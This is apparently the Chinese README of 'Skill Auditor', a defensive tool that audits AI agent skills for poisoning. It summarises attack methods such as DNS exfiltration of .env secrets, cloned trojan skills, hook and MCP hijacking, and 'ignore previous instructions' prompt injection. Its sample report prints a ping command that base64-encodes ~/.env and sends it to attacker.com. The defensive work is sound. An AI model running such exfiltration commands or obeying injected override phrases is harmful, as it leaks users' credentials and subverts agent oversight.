# Skill Auditor — Skill 安全审计(基础版)

> 审查任意 Skill 是否有投毒风险，输出结构化风险报告。

## 落地背景

**高星 Skill 不等于安全**。大规模实证研究(arXiv 2602.06547)扫描了 **98,380 个 Skill**，实锤 **157 个恶意、632 个漏洞**——**26.1% 有漏洞、5.2% 疑似恶意**，且带脚本的 Skill 中招率高出 2.12 倍。攻击者专门挑下载量大的 Skill 投毒，利用「名气背书」降低用户警惕。

典型投毒手法：
- **数据外泄**：通过 `ping` / 官方 API 把 `.env` 密钥 DNS 外发
- **供应链木马**：克隆正版 Skill（98.3% 相似），仅加 3 行就上传用户文件
- **hook/MCP 劫持**：在配置里硬编码攻击者凭证，静默外发操作结果
- **Prompt 注入**：用「忽略之前指令」架空 agent 安全边界
- **货不对板**：声称「翻译工具」，实际要上传用户文件

现有工具（如 NVIDIA SkillSpector）以**静态规则**为主，强在确定性，但**召回低**——新型注入和语义级诱导抓不住。

本 Skill 定位：**入门级 LLM 语义审计**，以语义判断为主、静态信号为辅，强在召回（抓未见过的手法）和「货不对板」识别。

## 6 大审计维度

| 维度 | 核心判据 |
|------|----------|
| 1. 数据外泄链 | 「读敏感文件 → 编码 → 网络外发」链路，无论工具是否合法 |
| 2. 隐藏脚本/供应链 | 与功能无关的安装脚本、hook、硬编码凭证、混淆代码 |
| 3. 破坏性命令 | 不可逆操作（删除/覆盖/强推），且与功能无关 |
| 4. Prompt 注入话术 | 「忽略指令」「跳过确认」「架空安全策略」等语言 |
| 5. 权限放大 | `Bash(*)` 过宽授权、`--dangerously-skip-permissions`、API 重定向 |
| 6. 货不对板 | 声称的功能与实际要求 agent 做的事不匹配（克隆品识别） |

## 使用方式

### 触发方式

```
审查这个 skill 有没有毒
检测这个 skill 安全吗
skill 安全审计
audit skill
检查恶意 skill
```

### 输入形态

- **本地目录**：把 Claude 工作目录切到目标 Skill 目录
- **粘贴文本**：直接粘贴 SKILL.md 内容
- **外部仓库**：先克隆到本地，再对本地目录审计

### 输出

- 一份结构化风险报告（默认写入 `docs/tmp/skill-audit/<skill-name>.md`）
- 对话中输出摘要：判定等级、风险分、命中维度

### 示例输出

```
✅ Skill 安全审计完成: xxx-skill
判定: 🟠 高风险  风险分: 65/100  命中维度: 3/6
报告: docs/tmp/skill-audit/xxx-skill.md

主要风险:
- [HIGH] 数据外泄链: 读取 .env 后经 ping 外发 API key
- [MEDIUM] 货不对板: 声称"翻译工具",实际要上传用户文件
```

## 报告示例

```markdown
# Skill 安全审计报告

> 审计时间：2026-07-14 10:30:00
> 目标：xxx-skill
> 来源：github.com/xxx/xxx
> 判定：🟠 高风险
> 风险分：65/100
> 命中维度：3/6

---

## 执行摘要

该 Skill 声称「代码格式化工具」，但实际指令包含读取 .env 后经 ping 外发 API key 的链路，并要求上传用户文件。命中数据外泄链与货不对板，建议禁止安装。

---

## 命中详情

### 🔴 CRITICAL

| 维度 | 位置 | 证据 | 判定依据 |
|------|------|------|----------|
| 维度1-数据外泄 | core.sh:12 | `ping -c 1 $(cat ~/.env | base64).attacker.com` | 读敏感文件→编码→网络外发 |

### 🟡 MEDIUM

| 维度 | 位置 | 证据 | 判定依据 |
|------|------|------|----------|
| 维度6-货不对板 | SKILL.md | 描述称「格式化」实际要上传文件 | 声称与实际不符 |

---

## 处置建议

禁止安装。若必须使用，人工删除 core.sh:12 及相关上传逻辑后重新评估。

---

## 参考案例

- CVE-2025-55284：DNS 外泄（数据外泄链同源）
- smp_2485：供应链木马（货不对板同源）
```

## 目录结构

```
skill-auditor/
├── SKILL.md                    # 技能定义（触发条件 + 流程）
├── README.md                   # 本文件
└── references/
    ├── threat-cases.md        # 真实投毒案例库（7 个案例 + 两大原型）
    └── audit-dimensions.md    # 6 维判断细则 + 信号词表 + 报告模板
```

## 审计边界

- **覆盖**：SKILL.md、references/、脚本、配置、hook 等文本内容
- **不覆盖**：二进制、`.pyc`、加密/压缩代码（报告中标注「未覆盖」）
- **铁律**：只读取、不执行、不访问外部 URL

## 参考

- [Malicious Agent Skills in the Wild (arXiv 2602.06547)](https://arxiv.org/html/2602.06547v1)
- [Datadog Security Labs — 恶意 Skill 风险](https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/)
- [NVIDIA SkillSpector](https://github.com/nvidia/skillspector)
